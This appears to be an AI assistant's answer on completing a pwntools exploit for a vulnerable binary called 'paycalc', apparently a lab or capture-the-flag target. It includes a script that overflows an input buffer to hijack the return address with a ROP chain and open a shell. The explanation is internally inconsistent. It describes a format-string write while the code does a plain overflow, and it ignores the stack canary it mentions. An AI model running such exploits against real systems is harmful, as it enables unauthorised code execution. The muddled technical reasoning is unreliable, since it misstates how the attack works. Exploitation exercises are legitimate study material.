To use the ROP chain to achieve command execution, you will need to find a way to overwrite the return address of a function with the address of the first gadget in the ROP chain. You can then send the ROP chain payload as the input to the vulnerable binary, which will execute the gadgets in the ROP chain when the function returns.  

One way to do this is to find a string format vulnerability in the binary that allows you to write to an address on the stack. You can then use the string format vulnerability to overwrite the return address with the address of the first gadget in the ROP chain.  

In the script you provided, the string format vulnerability is being exploited to leak the stack canary, but it does not appear to be attempting to exploit the vulnerability further. To use the ROP chain to achieve command execution, you will need to modify the script to send a payload that includes the ROP chain and uses the string format vulnerability to overwrite the return address with the address of the first gadget in the ROP chain.  

Here is an example of how you could modify the script to achieve command execution using the ROP chain:  

```
Copy code
from pwn import *
import re

# Path to the vulnerable binary
binary_path = "./paycalc"

# Load the binary into pwntools
elf = ELF(binary_path)

# Start the process
p = process(elf.path)

# Receive the prompts and send the input
p.recvuntil('EMPLOYEE NAME:')
p.sendline(b'adam')
p.recvuntil('HOURS WORKED:')
p.sendline(b'60')
p.recvuntil('REASON FOR OVERTIME:')

# Send the payload to overwrite the return address with the address of the first gadget in the ROP chain
payload = b'A' * offset + p64(gadget_addr) + rop_chain
p.sendline(payload)

# Drop to an interactive shell
p.interactive()
```
You will need to replace the following placeholders in the above code:

## offset: This is the number of bytes you need to send as padding before the ROP chain in order to overwrite the return address. You can determine this value by finding the address of the return address on the stack and calculating the difference between that address and the address of the buffer that you are writing to.
 - it is possible to determine the return address via format string vulnerability as the values being printed by the string format specifiers are being printed in the order that they appear on the stack. The return address is typically stored on the stack immediately after the function's arguments and local variables, so it should be one of the values being printed by the string format specifiers.  

## gadget_addr: This is the address of the first gadget in the ROP chain. You will need to find this address in the binary and convert it to a packed 64-bit integer using the p64 function.  

## rop_chain: This is the ROP chain payload generated by ROPgadget. You will need to convert it to a bytes object using the bytes function.
